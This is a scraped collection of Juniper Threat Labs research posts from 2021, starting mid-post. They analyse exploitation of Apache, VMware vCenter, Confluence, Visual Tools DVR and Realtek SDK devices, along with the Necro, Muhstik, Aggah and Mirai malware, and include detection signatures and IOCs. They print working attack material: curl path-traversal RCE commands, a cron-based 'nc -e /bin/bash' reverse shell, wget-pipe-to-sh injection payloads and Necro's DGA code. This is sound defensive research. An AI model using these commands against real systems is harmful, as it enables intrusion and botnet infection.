binary should have executable permissions for /bin/sh. Below is the vulnerable configuration of httpd.conf: mod_cgi module enabled in httpd.conf We can check the response with a one-liner curl command: curl ‘http://<Target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh’ -d ‘A=|echo;id’ -vv Testing remote code execution curl ‘http://<Target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh’ –data ‘echo Content-Type: text/plain; echo; id’ Testing remote code execution with double encoding By conducting a simple search on Shodan, results show s that there are over 112,000 Apache servers across the globe running on Apache http server version 2.4.49 and almost 13,000 with version 2.4.50. There might be other vulnerable web servers configured that do not display version information. Shodan results for Apache Http Server 2.4.49 Image Source: Shodan Shodan results for Apache Http Server 2.4.50 Image Source: Shodan Remediation and Conclusion: Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability by the signature: HTTP: APACHE: APACHE-PATH-TRAV. At the same time, all customers are recommended to update to the latest stable version of Apache http server as soon as possible, as per the advisory released by the Apache Foundation and to mitigate any risk associated with active exploitation of the flaw. Indicators of Compromise: Below are some of the attacker’s IOC’s: 45[.]146.164.110 139[.]59.126.50 128[.]90.166.247 128[.]90.161.152 128[.]90.166.31 157[.]119.200.185 163[.]172.173.238 89[.]248.173.143 145[.]220.25.28 134[.]122.112.12 145[.]220.25.6 161[.]35.86.181 143[.]198.136.88 155[.]138.142.87 167[.]99.133.28 185[.]111.51.118 185[.]225.17.102 89[.]46.62.130 137[.]184.69.137 140[.]213.59.194 142[.]93.35.77 143[.]198.62.76 157[.]230.212.97 157[.]230.216.201 157[.]245.153.240 157[.]245.51.232 178[.]128.164.5 46[.]101.59.235"}}
{"https://blogs.juniper.net/en-us/threat-research/necro-python-botnet-goes-after-vulnerable-visualtools-dvr": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-10-11", "source": "blogs.juniper.net"}, "text": "In the last week of September 2021, Juniper Threat Labs detected a new activity from Necro Python (a.k.a N3Cr0m0rPh , Freakout, Python.IRCBot) that is actively exploiting some services, including a new exploit added to its arsenal. This new exploit targets Visual Tools DVR VX16 4.2.28.0 from visual-tools.com (no CVE number is assigned to this vulnerability). Successful exploitation will download the bot into the system and install a Monero miner. Necro was first discovered in January . The threat actor made a move in March and in May, adding new exploits to its arsenal. Necro bot is an interesting python bot that has many functions which include the following: Network Sniffer Spreading by exploits Spreading by brute-force Using Domain Generation Algorithm Installing a Windows rootkit Receiving and executing bot commands Participating in DDoS attacks Infecting HTML, JS, PHP files Installing Monero Miner The script can run in both Windows and Linux environments. The script has its own polymorphic engine to morph itself every execution which can bypass signature-based defenses. This works by reading every string in its code and encrypting it using a hardcoded key. Necro Python’s polymorphism, before and after Domain Generation Algorithm Necro uses DGA for both its CnC and download server. It selects from a list of dynamic DNS services as its domain, e.g., ddns.net and prefixes that with 10-19 random characters. E.g., ‘ 3ood3dfcqchro.ddns.net’ The domains are pseudo-randomly generated using a hardcoded seed, 0xFAFFDED00001, and a counter is added until 0xFD (253 in decimal) before the counter is reset to 0. The seed controls the domain to be generated.  In effect, it can generate up to 253 unique domains. This seed is different from the previous campaigns. For instance, the sample used in the March attack used a different seed, 0x7774DEAD. From this list of generated domains, it connects to them one by one to see which one is online. During our analysis, the following DGA domain was active: gtmpbeaxruxy[.]myftp.org import random counter=0 while 1: if counter>=0xFD: counter=0 counter+=1 random.seed(a=0xFAFFDED00001 + counter) DGA_DOMAIN=(''.join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randrange(10,19)))).lower()+\".\"+random.choice(['ddns.net', 'ddnsking.com', '3utilities.com', 'bounceme.net', 'freedynamicdns.net', 'freedynamicdns.org', 'gotdns.ch', 'hopto.org', 'myddns.me', 'myftp.biz', 'myftp.org', 'myvnc.com', 'onthewifi.com', 'redirectme.net', 'servebeer.com', 'serveblog.net', 'servecounterstrike.com', 'serveftp.com', 'servegame.com', 'servehalflife.com', 'servehttp.com', 'serveirc.com', 'serveminecraft.net', 'servemp3.com', 'servepics.com', 'servequake.com', 'sytes.net', 'viewdns.net', 'webhop.me', 'zapto.org']) Necro Python’s Domain Generation Algorithm Bot Commands Necro connects to the CnC server,  gtmpbeaxruxy.myftp.org, via IRC to receive commands which include the following: Command Function addport add port to the scanner delport remove port from scanner ports send to server the ports currently scanned injectcount send to server the number of files injected reinject launch function to inject to html, php, js, htm files scanner stop or launch scanner sniffer stop or launch sniffer scannetrange scan a range of IPs clearscan empty scanner DB revshell launch a reverse shell shell launch a process using subprocess.Popen() killknight kill itself execute executes a file killbyname kill process by name killbypid kill process by pid disable disable exploitation module enable enable exploitation module getip get current IP ram get information about the memory update update this bot visit visit a URL dlexe download and execute a file info get system information repack morph this bot logout logout from the server reconnect reconnect to the server udpflood UDP flood synflood SYN flood tcpflood TCP flood slowloris slowloris DDoS attack httpflood launch httpflood torflood launch DDoS using TOR SOCKS proxies loadamp initialize amplification attack reflect launch DNS reflection attack We have noted a few changes on this bot from the previous version. First, it removed the SMB scanner which was observed in the May 2021 attack. Second, it changed the url that it injects to script files on the compromised system. Previously, it used a hardcoded url, ‘ ublock-referer[.]dev/campaign.js ’ and injects this on the scripts and now it uses the DGA for its url, i.e., ‘DGA_DOMAIN/campaign.js’ . As noted in the previous reports, this bot will find HTML, PHP, JS and HTM files in the system and will inject a javascript code in every file. This is an attempt for that attacker to not only compromise the server but also clients connecting to it. Using a DGA domain to host the javascript makes it more resilient against defenses. Necro injects javascript code to html, htm, php and .js files found on the compromised server. It uses the DGA domain to host campaign.js Necro injects javascript code to html, htm, php and .js files found on the compromised server. It uses the DGA domain to host campaign.js We also noted a change in its TOR Socks proxies. When the bot receives the “ torflood ” command, it uses a set of TOR proxies for its DDOS attacks. New Tor Proxies [‘107.150.8.170:9051’, ‘95.217.251.233:1080’, ‘5.130.184.36:9999’, ‘83.234.161.187:9999’, ‘185.186.240.37:9119’, ‘5.61.53.57:9500’, ‘23.237.60.122:9051’, ‘185.82.217.167:9051’, ‘78.153.5.183:666’, ‘51.210.202.187:8425’, ‘85.159.44.163:9050’, ‘217.12.221.85:9051’, ‘130.61.153.38:9050’, ‘142.93.143.155:9010’, ‘8.209.253.198:9000’, ‘127.0.0.1:9050’] Visual Tools DVR Exploit As noted above, this bot added a new exploit to its arsenal. The exploit targets Visual Tools DVR VX16 4.2.28.0. A poc for this exploit was made available to the public in July, 2021. HTTP request made to attack Visual Tools DVR Aside from the bot, the payload will install a XMRig Monero miner with the following wallet. 45iHeQwQaunWXryL9YZ2egJxKvWBtWQUE4PKitu1VwYNUqkhHt6nyCTQb2dbvDRqDPXveNq94DG9uTndKcWLYNoG2uonhgH The scanner function of the bot scans for the following ports and if available, it launches its attack. TARGET_PORTS = [22, 80, 443, 8081, 8081, 7001] Juniper Threat Labs is still seeing this Necromorph exploiting the following vulnerabilities: CVE-2020-15568 – TerraMaster TOS before 4.1.29 CVE-2021-2900 – Genexis PLATINUM 4410 2.1 P4410-V2-1.28 CVE-2020-25494 – Xinuos (formerly SCO) Openserver v5 and v6 CVE-2020-28188 – TerraMaster TOS <= 4.2.06 CVE-2019-12725 – Zeroshell 3.9.0 Detection Exploits used in this attack are detected by Juniper’s NGFW SRX series. HTTP:CGI:BASH-CODE-INJECTION HTTP:CTS:TERRAMASTER-TOS-INJCTN HTTP:CTS:SCO-OPNSRVR-OS-INJ HTTP:CTS:GENEXIS-PLAT-RCE HTTP:CTS:ZEROSHELL-CGI-BIN-RCE Juniper Advanced Threat Prevention Cloud detects this bot as follows: Juniper Advanced Threat Prevention DNS Security also detects the DGA domain. Indicators of Compromise Domains: gtmpbeaxruxy[.]myftp.org URLs: http://gtmpbeaxruxy[.]myftp.org/setup.py http://gtmpbeaxruxy[.]myftp.org/setup http://gtmpbeaxruxy[.]myftp.org/xmrig http://gtmpbeaxruxy[.]myftp.org/xmrig1 Files: File Hash File Name Eb4a48a32af138e9444f87c4706e5c03d8dc313fabb7ea88c733ef1be9372899 setup E524bd7789b82df11891cc2c12af1ac0ea41dd0b946e1e04a4246cb36321f82f setup.py 0e537db39a7be5493750b7805e3a97da9e6dd78a0c7fca282a55a0241803d803 xmrig F72babf978d8b86a75e3b34f59d4fc6464dc988720d1574a781347896c2989c7 xmrig1 IP Addresses & ports: 107[.]150.8.170:9051 130[.]61.153.38:9050 142[.]93.143.155:9010 185[.]186.240.37:9119 185[.]82.217.167:9051 217[.]12.221.85:9051 23[.]237.60.122:9051 5[.]130.184.36:9999 5[.]61.53.57:9500 51[.]210.202.187:8425 78[.]153.5.183:666 8[.]209.253.198:9000 83[.]234.161.187:9999 85[.]159.44.163:9050 95[.]217.251.233:1080"}}
{"https://blogs.juniper.net/en-us/threat-research/cve-2021-22005-vmware-vcenter-analytics-service-arbitrary-file-upload-vulnerability": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-10-05", "source": "blogs.juniper.net"}, "text": "VMware vCenter server is a centralised management utility used for managing multiple ESXi hosts, virtual machines and all their dependent components. An arbitrary file upload vulnerability has recently been discovered in the Analytics service of VMware vCen t er Server. V M ware has confirmed that this vulnerability is being actively exploited in the wild and CVE-2021-2205 has been assigned to it. More details about this vulnerability and various affected versions can be found at NVD . This blog examines how th is vulnera bility can be exploited in the unpatched vCenter Server 7.0. Vulnerability Details In our lab, we have locally setup vCenter 7.0 build 17920168 to test the attack scenario. The Customer Experience Improvement Program (CEIP) enables VMware to collect user usage statistics to improve their product and provide better user support. Some of these statistics are: Configuration Data Feature Usage Data Performance Data Product Log Data Use rs can opt in or out of CEIP from vCenter’s vSphere Client: VMware CEIP First, we determined how this telemetry data is collected and stored by VMware server. By taking a look at its various configurations, Juniper Threat Labs found analytics proxy.conf that defines several API calls specific to telemetry, as shown below: /analytics/telemetry/ph/api/hyper/send /analytics/telemetry/ph/api/level VMware analytics API configuration We also observe d that l ocal and 15080 is configured which should indicate hostname and port used for these APIs. We can see that a service called vmware -analytics is running over tcp port 15080 : vmware-analytics running over port 15080 The API in use is confirmed when we perform network capture on port 15080. POST request is sent to “ /analytics/telemetry/ph/api/hyper/send” . The query parameters “ _c” and “ _i” defines the filename for the log collected in JSON format wherein the filename is in following format: _c< value of parameter _c >_i< value of parameter _i >.json Result of tcpdump on port 15080 Looking at the logs, we can see that the file is created under folder “ / var/log/ vmware /analytics/pro d” , with the body of POST request appended to it: File created An arbitrary file upload vulnerability exists in vulnerable versions of VMware vCenter. Any user with web access to vCenter server can make use of the analytics endpoints to create arbitrary files at any directory of their choice. A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution. As an example, following curl request can create a file “ _c_itest.json” with content “ Example” in location “ /var/log/vmware/analytics/prod/” : curl -kv “https://<vCenter-Server-ip>/analytics/telemetry/ph/api/hyper/send?_c&_i=test” -d “Example” -H “Content-Type: application/json” S teps to recreate attack scenario Create a directory with a test file. Testing creation of directory and file File 1234.json created As we can see filename “ 1234.json” is created inside folder “ _ c_i” . Create a file in “/ tmp” to check for directory traversal Testing directory traversal Folder “ _ c_i” that was created in previous step is important to perform directory traversal , because the process will look for “_ c_i /.. /.. /.. /.. /.. /.. / tmp /” folder before writing the file “ test2.json” at destination location: File created in /tmp by directory traversal R emote C ode E xecution To achieve remote code execution and obtain a reverse shell, the following steps can be taken: On the victim’s server, create a cron job at “ /etc/cron.d/” using directory traversal. Provide the appropriate payload to attain reverse shell as body of request. On attacker machine, use nc to listen on port where we expect to get reverse shell from vCenter server. Let us first creat e a c ro n job file at “ / etc / cron.d /” to run as file owner and provide reverse shell. Here the reverse shell payload used is: ***** root nc –e /bin/bash 192.168.1.2 4444 This payload when written to file reverse .json at “ / etc / cron.d /” would run the nc –e /bin/bash 192.168.1.2 4444 command every minute. Creating cron job to obtain reverse shell cron job created at /etc/cron.d Once the file is created as expected, we would receive a reverse shell from vCenter server at port 4444 as seen below: Reverse shell obtained from vCenter server Remediation and Conclusion Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability using the signature : HTTP:CTS:VCNTR-ANALYTCS-AFU The signature is released as part of export number 3422 and is part of recommended template. At the same time, all customers are recommended to update to latest stable version of vCenter as per the advisory released by VMware."}}
{"https://blogs.juniper.net/en-us/threat-research/muhstik-botnet-targeting-confluence-servers-with-cve-2021-26084": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-09-09", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs is seeing an on-going attack targeting Confluence servers. On August 25, Atlassian, the company behind Confluence, disclosed the vulnerability CVE-2021-26084 . A few days after that , several proofs-of-concept to exploit this vulnerability surfaced online , which included an unauthenticated remote code execution (RCE). Along with that, we started seeing an active exploitation of this vulnerability in our telemetry which started on September 02. Most of the attacks are on port 8090, which is the default port for Confluence. CVE-2021-26084 attacks A dominant attack we have seen is an attack by the Muhstik botnet. CVE-2021-26084 attack from Muhstik bot The attack will download a file shell script, conf2 from 192.31.52.174 and will execute it with bash. The script will download the additional binaries dk86 and dk32 from 194.131.52.174 and save them in the temp directory. Additionally, it will download another script, ldm , from 18.235.127.50 . Inside conf2 bash script Dk86 is the 64-bit version of the Muhstik bot and Dk32 is the 32-bit version. Muhstik bot connects to an IRC server to receive commands which include the following: Download files Shell commands Flood attacks SSH brute force Functions inside Muhstik bot binary The ldm script is another bash script which has functions to download additional scripts and binaries via the following TOR links. https://bvprzqhoz7j2ltin[.]onion https://bvprzqhoz7j2ltin[.]tor2web.su/ https://bvprzqhoz7j2ltin[.]onion.ly/ https://bvprzqhoz7j2ltin[.]onion.ws/ Unfortunately, those links were offline during our investigation. ldm script dowloads “main” file The “ ldm ” script also has a function to execute remote commands on hosts that it can access via SSH. It enumerates the users in the host via the “ /home ” directory. It enumerates the ssh keys by looking into the files: /home/*/.ssh/config /root/.ssh/config “*.pem” file in each home or root folder id_rsa* in each home or root folder It also enumerates hosts by: Checking for “Hostname” in .ssh/config file Look into .bash_history file for commands with ssh or scp Look for IPs in .ssh/known/hosts It uses all this information to execute a command to download shell scripts, 3sh or 1sh from 34.221.40.237 . This script will download a version of the Muhstik bots, pty1 .. pty10 and the ldm script. Routine of “ldm” script to execute remote commands via SSH Contents of 1sh shell script to download Muhstik bot and ldm Censys has been tracking vulnerable Confluence servers. According to their report, there were 11,689 vulnerable Confluence servers on Sep 2, 2021. This number was reduced to 8,597 on Sep 4, 2021 which shows that people are trying to take action about this serious vulnerability. We recommend that customers upgrade and patch their confluence servers immediately. The malicious requests exploiting CVE-2021-26084 are detected by Juniper’s NGFW SRX series with IDP signatures HTTP:APACHE:STRUTS2-OGNL-INJ and HTTP:CTS:CONFLUENCE-DC-OGNL-INJ. Juniper Advanced Threat Prevention Cloud detects the Muhstik bot as follows. Indicators of Compromise 192[.]31.52.174 34[.]221.40.237 157[.]230.189.52 18[.]235.127.50 fe98548300025a46de1e06b94252af601a215b985dad31353596af3c1813efb0 *dk32 0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049 *dk86 39db1c54c3cc6ae73a09dd0a9e727873c84217e8f3f00e357785fba710f98129 *ldm a91dffe65048e39dfe1fd8da0b0dac11807718cdd5efedf4206a18af78779b0a *conf2 http://194[.]31.52.174/dk86 http://194[.]31.52.174/dk32 http://34[.]221.40.237/.x/pty1 http://34[.]221.40.237/.x/pty2 http://34[.]221.40.237/.x/pty10 http://34[.]221.40.237/.x/pty11 http://34[.]221.40.237/.x/pty3 http://34[.]221.40.237/.x/pty5 http://34[.]221.40.237/.x/pty4 http://34[.]221.40.237/.x/pty3 http://34[.]221.40.237/.x/pty3 http://157[.]230.189.52/wp-content/themes/twentynineteen/ldm http://18[.]235.127.50/ldm https://bvprzqhoz7j2ltin[.]onion https://bvprzqhoz7j2ltin[.]tor2web.su/ https://bvprzqhoz7j2ltin[.]onion.ly/ https://bvprzqhoz7j2ltin[.]onion.ws/"}}
{"https://blogs.juniper.net/en-us/security/aggah-malware-campaign-expands-to-zendesk-and-github-to-host-its-malware": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-09-08", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs has detected a new development in the Aggah malware campaign. Previously, Aggah was known to be using legitimate infrastructures like BlogSpot, WordPress and Pastebin to host its malware. Recently, we discovered an ongoing campaign where Aggah threat actors host their malware using Zendesk attachments and GitHub. This campaign delivers several types of malware that are focused on stealing sensitive information, such as usernames and passwords, credit card information stored in browsers and crypto wallets. We detected a malicious Microsoft PowerPoint sample, ed70f584de47480ee706e2f6ee65db591e00a114843fa53c1171b69d43336ffe , which was downloaded from Zendesk’s own infrastructure as an attachment: http://p17[.]zdusercontent[.]com/attachment/9061705/eyckz3zuedoivxtp0i629aoxe The PowerPoint document contains a malicious macro file that connects to a shortened bitly.com URL which expands to https://mujhepyaslagihaimujhepanipilao[.]blogspot[.]com/p/mark2html in order  download and execute a malicious Script via mshta.exe. Fig.1. The VB script in .ppt executes another script from bitly.com using mshta. Fig.2. Bitly url expands to https://mujhepyaslagihaimujhepanipilao[.]blogspot[.]com/p/mark2html The script, mark2.html , hosted on mujhepyaslagihaimujhepanipilao[.]blogspot[.]com , performs a series of operations, such as creating a Run entry in the registry to execute a PowerShell script, download and execute another script using scheduled task and use WMI in the registry Run key to download and execute another script. Fig.3. Series of operations done by mark2.html The code shown in Figure 3 downloads from the following links and executes them. https://ia801405us[.]archive[.]org/11/items/pg_20210716/blessed.txt https://randikhanaekminar[.]blogspot[.]com/p/elevatednew1.html https://backbones1234511a[.]blogspot[.]com/p/elevatednew1backup.html https://startthepartyup[.]blogspot.com/p/backbone15.html https://ghostbackbone123[.]blogspot.com/p/ghostbackup14.html Blessed.txt The PowerShell script is hosted on archive.org as blessed.txt . The PowerShell loads a stealer malware, known as Oski. The Oski malware is included in the PowerShell script as a hex-encoded string. It uses a technique known as Signed Binary execution via RegSvcs.exe and .NET Assembly.Load to load this binary as an added layer of protection since it’s not saved to the disk and only stays in memory. Fig. 4 Blessed.txt is a PowerShell script that contains a Windows executable which it loads via RegSvcs.exe Oski was first seen in 2019. Today, it’s sold in Russian hacking forums for $70-$100. Oski malware’s capabilities include: Stealing cryptocurrency wallets Stealing sensitive information stored in browsers such as credit card data, autofill data and cookies Stealing credentials from various applications such as FTP, VPN and web browsers Capturing screenshots Collecting system information Downloading and installing additional malware Fig . 5 Oski code that steals crypto and browser data Oski connects to the following C2 server: 103.153.76.164 After it collects and exfiltrates the data, it will delete traces of itself in the system. Elevatednew1.html One other routine that we have listed above in Fig. 3 includes creating a scheduled task to download and execute another malicious script hosted on https://randikhanaekminar[.]blogspot[.]com/p/elevatednew1.html . This malicious script loads another PowerShell script named blessed.txt . This time, the script is hosted in GitHub as follows: https://raw[.]githubusercontent[.]com/manasshole/newone/main/blessed.txt Fig. 6 Script code inside elevatednew1.html executes a PowerShell hosted in GitHub.com The malware that it tries to install is Agent Tesla, a .NET keylogger and RAT that logs keystrokes and the host’s clipboard content. The other malicious scripts backbone15.html and ghostbackup14.html are no longer available for download, while elevatednew1backup.html is the same as elevatednew1.html Before publication of this blog, we have contacted Zendesk and Github and they quickly responded to disable the hosted malware. Conclusion The threat actors’ primary goal is to steal sensitive information such as usernames and passwords, credit cards and crypto wallets. On the surface, this may seem to have a low impact in comparison with ransomware operations targeting enterprises. However, the Aggah threat actors’ method of using legitimate infrastructure is worrisome. As a defender, one way to disrupt malicious activity is to detect their infrastructure. This is usually effective as it’s not that easy to change infrastructures. As we have observed and noted, threat actors using GitHub, Archive.org, Zendesk, GitHub, Pastebin and Google Drive are not going away anytime soon and we expect their malicious efforts to continue. For instance, Juniper Threat Labs has also seen a growing usage of Zendesk to host malware, which may warrant its own blog in the future. In this particular case, Juniper Networks’ Advanced Threat Prevention (ATP) solution detects the Aggah malware file as follows: IOC ed70f584de47480ee706e2f6ee65db591e00a114843fa53c1171b69d43336ffe 103[.]153[.]76[.]164 https://raw[.]githubusercontent[.]com/manasshole/newone/main/blessed.txt http://p17[.]zdusercontent[.]com/attachment/9061705/eyckz3zuedoivxtp0i629aoxe https://ia801405us[.]archive[.]org/11/items/pg_20210716/blessed.txt https://randikhanaekminar[.]blogspot[.]com/p/elevatednew1.html https://backbones1234511a[.]blogspot[.]com/p/elevatednew1backup.html https://startthepartyup[.]blogspot.com/p/backbone15.html https://ghostbackbone123[.]blogspot.com/p/ghostbackup14.html"}}
{"https://blogs.juniper.net/en-us/threat-research/attacks-continue-against-realtek-vulnerabilities": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-09-02", "source": "blogs.juniper.net"}, "text": "As we predicted in last week’s post , threat actors continue to utilize new Realtek vulnerabilities disclosed by IoT Inspector Research Lab to distribute malware. Starting on August 19 th , Juniper Threat Labs observed a new set of attacks in the wild on IoT firmware built with the Realtek SDK, this time targeting CVE-2021-35395, which was just disclosed on August 16 by IoT Inspector. (Some of these attacks were previously noted in a SAM Seamless Network blog post .) These attacks are ongoing. The Attack The vulnerabilities in CVE-2021-35395 affect software built with the Realtek Jungle SDK (versions v2.x up to v3.4.14B) that utilize an SDK-provided management interface over HTTP. Among these vulnerabilities is a command injection on the “formWsc” page caused by a failure to sanitize input. Upon receiving the peerPin parameter, the server copies the submitted value directly into a shell command string which is then executed: \"iwpriv wlan%d-vxd set_mib pin= %s \" The “%s” (in bold) is replaced by the contents of peerPin. By adding a semicolon to terminate the iwpriv statement, it is possible to execute arbitrary commands on the device. For example, given an HTTP POST request containing “peerPin=12345;malicious_command”, the device will first execute the iwpriv command as expected, but will then also execute malicious_command . In one set of observed attacks, starting on August 24 th , the attackers sent POST requests similar to the following: Figure 1. Malicious POST request exploiting CVE-2021-35395. The injected command is: wget hxxp://37[.]0.11.132/rh -O - | sh which downloads and executes a script named ‘rh’: Figure 2. Malicious script downloaded by the injected command. This script is nearly identical to the one featured in last week’s post. The only change is that the parameter passed to the downloaded binary is “exploit.realtek.http” instead of “exploit.realtek”. When the botnet agent starts up, it opens a listening port on port 44842, and then opens a TCP connection to babaroga[.]lib (188[.]166.196.89, resolved specifically by DNS server 185[.]121.177.177) on port 53 and registers the compromised computer with the botnet, including an identifier — in this case, “exploit.realtek.http” — to indicate which attack was successful. We observed another set of attacks, first noted by SAM Seamless Network , that also used the same proof-of-concept exploit from the initial disclosure but with a different payload: Figure 3. Another example of a POST request exploiting CVE-2021-35395. The injected commands in the peerPin parameter attempt to download a malicious script called lolol.sh using either wget or curl and then execute it: cd /tmp;\r\nwget hxxp://212[.]192.241.87/lolol.sh;\r\ncurl -O hxxp://212[.]192.241.87/lolol.sh;\r\nchmod 777 lolol.sh;\r\nsh lolol.sh; The lolol.sh script starts by deleting logs and killing a large number of named processes and services, then specifically finding and killing processes using a significant amount of CPU time: Figure 4. lolol.sh terminating other processes on the target device. The script then tries to download a set of malicious binaries, one for each common CPU architecture. As before, the final payload is Mirai botnet malware. Each binary is renamed to nginx (a common web server and load balancer) before the script attempts to run it. Only the binary matching the target device architecture will successfully execute, and that process will immediately rename itself to avoid being terminated the next time lolol.sh runs. (Line 60 appears to be an error in the script.) Figure 5. lolol.sh attempting to download and execute Mirai binaries. To ensure persistence, the script downloads the latest version of lolol.sh and sets it to run every 10 minutes as a cron job. Figure 6. lolol.sh installing itself as a cron job. Finally, the script adds firewall rules to prevent the device from being reinfected, blocking inbound connectivity to the ports to which the vulnerable server is known to bind. Figure 7. lolol.sh blocking reinfection via the Linux firewall. Detection The malicious POST requests exploiting CVE-2021-35395 are detected by Juniper’s NGFW SRX series with IDP signature APP:MISC:REALTEK-JUNGLE-SDK-CI . The binaries and servers used in these attacks are blocked by Juniper Advanced Threat Prevention Cloud. Figure 8. Detection of malicious binaries by Juniper ATP Cloud. IOCs 26a79029381745c4a9fce656f49d84ca058c132cc228316b359a36f6a505b057  dark.86_64\r\n0473ad0259470808a1647ab093f735d8ba2e2b38161c6cc01018505079f850db  dark.arm5\r\n1a4077a5babf5eb892e573334a260d7457871ff608ee5755bee706acf14c2148  dark.arm6\r\nc481c8ae614abb2c7bf0ffd8094dabb6edc22c9146854ce1ee937ff6f9b3caf4  dark.arm7\r\nd7c66e79fe334f528efb926f4eb9494ac915a83964d11c2d5bad5407e4b483fa  dark.m68k\r\n171b3c4c6bc55c1e267929962105bd77d62e647b4c7beb56d0a61c23a129d9f3  dark.mips\r\n3bd4a60d5614e77b2f0c08d27f184d698097c84368e377a4c5376f99a735dcf0  dark.mpsl\r\nc1064e2b8be2015d06d11492d25931e8739028bdb89c8f0510b04278aa1b944b  dark.ppc\r\nf76d017a46373a16338dc55d1468e126850fdea5800dcf7f9800b25dd43ad84b  dark.sh4\r\neb9e47d6c312374a4d00b96cc9b0df3fa5f62d5aad3c892a44c62e34e464f7a3  dark.x86\r\n9793ac5afd1be5ec55476d2c205260d1b7af6db7cc29a9dc0f7fbee68a177c78  lolol.sh\r\n0018e361be72a44b7b38bbecfede8d571418e56d4d62a8e186991bef322a0c16  b.arm5\r\n171961046ee6d18424cf466ad7e01096aecf48ed602d8725e6563ad8c61f1115  b.arm7\r\n924b6aec8aa5935e27673ee96d43dd0d1b60f044383b558e3f66cd4331f17ef4  b.mips\r\n98fc6b2cbd04362dc10a5445c00c23c2a2cb39d24d91beab3c200f87bfd889ab  b.mpsl\r\n9bdb7d4778261bb34df931b41d32ee9188d0c7a7e10d4d68d56f6faebd047fe4  b.sh4\r\n2b57648fe6a75b589517cac9c515e0e6739c4aa39bfe7b3e81e2460b60edecd4  rh\r\n\r\n37[.]0.11.132\r\n212[.]192.241.72\r\n212[.]192.241.87\r\n103[.]113.143.232\r\n103[.]142.18.38\r\n103[.]142.18.60\r\n103[.]242.224.152\r\n103[.]242.224.164\r\n103[.]242.224.179\r\n117[.]210.156.253\r\n122[.]169.57.70\r\n185[.]222.59.10\r\n31[.]210.20.100\r\nbabaroga[.]lib (resolved by 185[.]121.177.177)\r\n188[.]166.196.89"}}
{"https://blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-08-27", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs has detected that the threat actors that we recently observed exploiting CVE-2021-20090 are now actively exploiting CVE-2021-35394 , a vulnerability disclosed last week by IoT Inspector Research Lab . This attack targets the Realtek RTL8xxx SoC chipsets that are used in many embedded devices, particularly wireless routers. At the time of this writing, all of the download servers used in this campaign are online and the attacks are ongoing. The Attack One of the Realtek vulnerabilities disclosed last week concerns a UDP server running on port 9034. In 2015, Peter Adkins found that certain D-Link routers were running a UDP server that allowed remote execution of arbitrary commands . This vulnerability was ostensibly patched, but IoT Inspector Research Lab found that the fix was simply to verify that all command strings had the prefix “orf”. This mitigation is easily circumvented by prepending “orf;” to any injected command string: orf;malicious_command Exploits require only a single UDP packet from the attacker. Each observed variant of this attack follows the same steps. First, the attackers use the open UDP server to inject a shell command: Figure 1. UDP Packet sent by attacker The injected command, seen in the data field above, is: orf;cd /tmp||cd /var&&busybox wget hxxp://45[.]61.188.184/f.sh -O b.sh&&sh b.sh;# The invalid “orf” command is ignored and a shell script is downloaded, renamed and executed. The following is an example of these shell scripts: Figure 2. One of the shell scripts used in the command injection This script attempts to download and run binary executables on the compromised host. Targeted architectures include: ARM (v5 and v7) MIPS (both big- and little-endian) SuperH The downloaded executables are variants of Mirai and turn the target computer into a remotely controllable bot in the threat actors’ botnet. We have observed an overlap between the IP addresses in this campaign and those in the campaign described in a recent Juniper Threat Labs blog post . However, unlike the previous attacks over HTTP, the connectionless nature of UDP allows the threat actors to launch more attacks with fewer resources. Other Vulnerabilities This discovery follows SAM Seamless Network’s blog post last week on these threat actors exploiting another Realtek vulnerability disclosed by IoT Inspector Research Lab. As many Realtek RTL8xxx-based devices remain unpatched, we expect to see continuing attacks as more of these vulnerabilities are weaponized. Detection This attack is detected on Juniper SRX devices as APP:MISC:REALTEK-JUNGLE-SDK-CI. The malicious files and servers used in this attack are blocked by the Juniper Advanced Threat Protection products. Figure 3. Detection by Juniper ATP Cloud IOCs Files:\r\ndaef5417dd163c2d2600382a484b36f594378d909ce54e5348b0c7dd1326c57d  r\r\n1ce6590f632d1b37c77feefe60ef632c315357ddde632c0a0aab78c69616a5b4  f.sh\r\n0018e361be72a44b7b38bbecfede8d571418e56d4d62a8e186991bef322a0c16  b.arm5\r\n171961046ee6d18424cf466ad7e01096aecf48ed602d8725e6563ad8c61f1115  b.arm7\r\n924b6aec8aa5935e27673ee96d43dd0d1b60f044383b558e3f66cd4331f17ef4  b.mips\r\n98fc6b2cbd04362dc10a5445c00c23c2a2cb39d24d91beab3c200f87bfd889ab  b.mpsl\r\n9bdb7d4778261bb34df931b41d32ee9188d0c7a7e10d4d68d56f6faebd047fe4  b.sh4\r\n555ae4193c53af15bdcd82d534ed5f13fcc96c16c59b9e8072b5b122c6df8d4a  fbot.mips\r\n2bfca0726b9109ab675e6bdbe0fb81e80fbf7ee6af2f129672569e5476e57b47  fbot.mpsl Attackers:\r\n45[.]137.23.190\r\n185[.]222.59.5\r\n103[.]145.13.80\r\n103[.]145.13.25\r\n\r\nDownload servers:\r\n45[.]61.188.184\r\n37[.]0.11.132"}}
